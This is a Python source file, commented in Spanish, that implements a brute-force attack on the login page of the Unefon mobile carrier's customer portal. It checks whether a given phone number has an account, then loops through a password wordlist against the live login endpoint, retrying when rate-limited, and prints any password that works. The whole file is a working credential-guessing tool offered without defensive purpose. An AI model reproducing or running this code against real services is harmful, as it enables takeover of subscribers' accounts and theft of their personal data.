import colores
import requests
import validacion


class unefon:

    def __init__(self, numero):
        self.numero = numero
        self.compañia = "Unefon"
        self.registrado = False
        self.registradoWeb = False
        self.noDisponible = True
        self.comprobarNumero()

    def comprobarNumero(self):

        _response = requests.post('https://www.unefon.com.mx/MiUnefonWeb/login',
                                  data=self.data(self.numero, 'badSecurity'),
                                  timeout=50)

        self.validaResponse(_response.text)

    def validaResponse(self, _data):

        if 'de mi unefon es' in _data:
            self.registradoWeb = True
            self.registrado = True

        elif 'Debes registrarte' in _data:
            self.registradoWeb = False
            self.registrado = True

        elif 'no pertenece a Unefon' in _data:
            self.registradoWeb = False
            self.registrado = False

        elif 'sentimos' in _data:
            self.registradoWeb = False
            self.registrado = False
            return self.comprobarNumero()

        else:
            self.registradoWeb = False
            self.registrado = False

    def ataqueDiccionario(self):

        colores.textPrimario(" >>> Casi empezamos ")

        _contraseñas = validacion.leerContraseñas()

        colores.hr()
        colores.textPrimario(" >>> Atancando ...  \n")

        for _contraseña in _contraseñas:

            _contraseña = _contraseña.rstrip('\n')

            _response = self.ataque(self.numero, _contraseña)

            print("  Probando:", _contraseña.ljust(30), "\033[0;m", end='\r')

            if _response.json()["objectResponse"]["esValido"]:
                colores.hr()
                colores.textSuccess("\t\t\t[ Contraseña correcta : " + _contraseña + "]")
                colores.hr()
                exit()

        colores.hr()
        colores.textError("\t\t\t[ Contraseña no encontrada ]")
        colores.hr()
        exit()

    def ataque(self, _numero, _contraseña):

        _response = requests.post('https://www.unefon.com.mx/MiUnefonWeb/login',
                                  data=self.data(self.numero, _contraseña),
                                  timeout=50)

        if 'sentimos' in _response.text:
            return self.ataque(self.numero, _contraseña)

        else:
            return _response

    def data(self, _numero, _password):

        return {
            'dn': _numero,
            'clave': _password,
            'recordar': 'false',
            'tmp_clave': ''
        }
